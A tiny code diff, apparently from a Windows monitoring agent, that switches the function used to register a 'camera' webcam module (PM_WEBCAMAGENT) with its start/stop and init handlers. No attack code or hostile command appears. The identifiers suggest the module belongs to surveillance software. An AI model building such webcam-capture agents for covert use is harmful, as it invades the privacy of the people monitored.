@@ -30,5 +30,5 @@ DWORD __stdcall PM_WebCamInit(JSONObject elem)
 
 void PM_WebCamRegister()
 {
-	AM_MonitorRegisterBSON(L"camera", PM_WEBCAMAGENT, NULL, (BYTE *)PM_WebCamStartStop, (BYTE *)PM_WebCamInit, NULL);
+	AM_MonitorRegister(L"camera", PM_WEBCAMAGENT, NULL, (BYTE *)PM_WebCamStartStop, (BYTE *)PM_WebCamInit, NULL);
 }
